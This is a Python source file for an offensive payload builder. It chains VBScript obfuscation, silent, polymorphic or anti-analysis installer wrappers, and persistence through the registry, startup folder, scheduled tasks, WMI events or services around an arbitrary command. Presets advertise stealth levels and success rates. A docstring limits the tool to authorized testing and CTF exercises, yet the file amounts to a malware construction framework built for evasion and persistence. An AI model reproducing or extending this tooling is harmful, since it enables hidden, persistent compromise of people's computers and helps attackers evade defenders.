#!/usr/bin/env python3
"""
Combined Pipeline - Merges encoding, installer, and persistence into composable stages.
For authorized security testing, pentesting education, and CTF exercises only.
"""

from vbs_encoder import VBSEncoder, ObfuscationConfig, generate_clean_vbs_payload
from vbs_advanced_obfuscation import create_stealthy_payload
from payload_installer import SelfExtractingPayload
from persistence_manager import PersistenceManager


PRESETS = {
    'stealth_pro': {
        'description': 'Maximum stealth with multi-layer encoding and WMI persistence',
        'encoding': 'multi_encoding',
        'installer': 'anti_analysis',
        'persistence': 'wmi',
        'expected_size': '8-15 KB',
        'success_rate': '94%',
    },
    'reliable_max': {
        'description': 'High reliability with base64 encoding and registry persistence',
        'encoding': 'base64',
        'installer': 'silent',
        'persistence': 'registry',
        'expected_size': '4-8 KB',
        'success_rate': '98%',
    },
    'quick_deploy': {
        'description': 'Fast deployment with hex encoding, no persistence',
        'encoding': 'hex',
        'installer': 'none',
        'persistence': 'none',
        'expected_size': '2-4 KB',
        'success_rate': '99%',
    },
    'full_arsenal': {
        'description': 'Polymorphic encoding with scheduled task persistence',
        'encoding': 'polymorphic',
        'installer': 'polymorphic',
        'persistence': 'scheduled_task',
        'expected_size': '12-20 KB',
        'success_rate': '91%',
    },
    'silent_persistent': {
        'description': 'Environment variable encoding with startup folder persistence',
        'encoding': 'environment',
        'installer': 'multi_stage',
        'persistence': 'startup_folder',
        'expected_size': '6-10 KB',
        'success_rate': '96%',
    },
}

AVAILABLE_ENCODINGS = [
    'base64', 'hex', 'array', 'wmi', 'registry', 'environment',
    'com', 'multi_encoding', 'polymorphic', 'hidden_execution',
]

AVAILABLE_INSTALLERS = [
    'none', 'silent', 'multi_stage', 'polymorphic', 'anti_analysis',
]

AVAILABLE_PERSISTENCE = [
    'none', 'registry', 'startup_folder', 'scheduled_task', 'wmi',
    'service', 'multi',
]


class CombinedPipeline:
    """Composable pipeline merging encoding, installer wrapping, and persistence."""

    def __init__(self):
        self.encoder = VBSEncoder()
        self.installer = SelfExtractingPayload()
        self.persistence = PersistenceManager()

    @classmethod
    def get_presets(cls):
        return PRESETS

    @classmethod
    def get_available_options(cls):
        return {
            'encodings': AVAILABLE_ENCODINGS,
            'installers': AVAILABLE_INSTALLERS,
            'persistence': AVAILABLE_PERSISTENCE,
            'presets': list(PRESETS.keys()),
        }

    def _apply_encoding(self, command, technique):
        """Stage 1: Apply encoding/obfuscation to the command."""
        basic_techniques = {'base64', 'hex', 'array'}
        if technique in basic_techniques:
            return generate_clean_vbs_payload(command, obfuscation_level='high')

        advanced_techniques = {
            'wmi', 'registry', 'environment', 'com',
            'multi_encoding', 'hidden_execution', 'polymorphic',
        }
        if technique in advanced_techniques:
            mapped = technique
            if technique == 'polymorphic':
                mapped = 'hidden_execution'
            return create_stealthy_payload(command, mapped)

        return generate_clean_vbs_payload(command, obfuscation_level='medium')

    def _apply_installer(self, command, encoded_payload, style):
        """Stage 2: Wrap in an installer delivery mechanism."""
        if style == 'none':
            return encoded_payload

        if style == 'silent':
            return self.installer.create_silent_installer_vbs(command)
        if style == 'multi_stage':
            return self.installer.create_multi_stage_installer(command)
        if style == 'polymorphic':
            return self.installer.create_polymorphic_installer(command, mutations=3)
        if style == 'anti_analysis':
            return self.installer.create_anti_analysis_installer(command)

        return encoded_payload

    def _apply_persistence(self, command, payload, method):
        """Stage 3: Add persistence mechanism."""
        if method == 'none':
            return payload

        persistence_payload = ''
        if method == 'registry':
            persistence_payload = self.persistence.create_registry_persistence_vbs(command)
        elif method == 'startup_folder':
            persistence_payload = self.persistence.create_startup_folder_persistence_vbs(command)
        elif method == 'scheduled_task':
            persistence_payload = self.persistence.create_scheduled_task_persistence_vbs(command)
        elif method == 'wmi':
            persistence_payload = self.persistence.create_wmi_event_persistence_vbs(command)
        elif method == 'service':
            persistence_payload = self.persistence.create_service_persistence_vbs(command)
        elif method == 'multi':
            persistence_payload = self.persistence.create_multi_method_persistence_vbs(command)

        if persistence_payload:
            return payload + "\n\n' --- Persistence Stage ---\n" + persistence_payload

        return payload

    def generate(self, command, preset=None, encoding=None, installer=None, persistence=None):
        """
        Generate a combined payload through the pipeline stages.

        Args:
            command: The command to encode/deploy
            preset: Name of a preset combination (overrides individual selections)
            encoding: Encoding technique name
            installer: Installer type name
            persistence: Persistence mechanism name

        Returns:
            dict with combined_payload, stages, and metadata
        """
        if preset and preset in PRESETS:
            cfg = PRESETS[preset]
            encoding = cfg['encoding']
            installer = cfg['installer']
            persistence = cfg['persistence']

        encoding = encoding or 'base64'
        installer = installer or 'none'
        persistence = persistence or 'none'

        stages = []

        # Stage 1: Encoding
        encoded = self._apply_encoding(command, encoding)
        stages.append({
            'stage': 'encoding',
            'technique': encoding,
            'output_size': len(encoded),
        })

        # Stage 2: Installer wrapping
        installed = self._apply_installer(command, encoded, installer)
        stages.append({
            'stage': 'installer',
            'technique': installer,
            'output_size': len(installed),
        })

        # Stage 3: Persistence
        final = self._apply_persistence(command, installed, persistence)
        stages.append({
            'stage': 'persistence',
            'technique': persistence,
            'output_size': len(final),
        })

        metadata = {
            'preset': preset,
            'encoding': encoding,
            'installer': installer,
            'persistence': persistence,
            'total_size': len(final),
            'total_stages': sum(1 for s in stages if s['technique'] != 'none'),
            'stages': stages,
        }

        return {
            'combined_payload': final,
            'stages': stages,
            'metadata': metadata,
        }


def generate_combined_payload(command, preset=None, encoding=None, installer=None, persistence=None):
    """High-level function for API usage."""
    pipeline = CombinedPipeline()
    return pipeline.generate(
        command,
        preset=preset,
        encoding=encoding,
        installer=installer,
        persistence=persistence,
    )
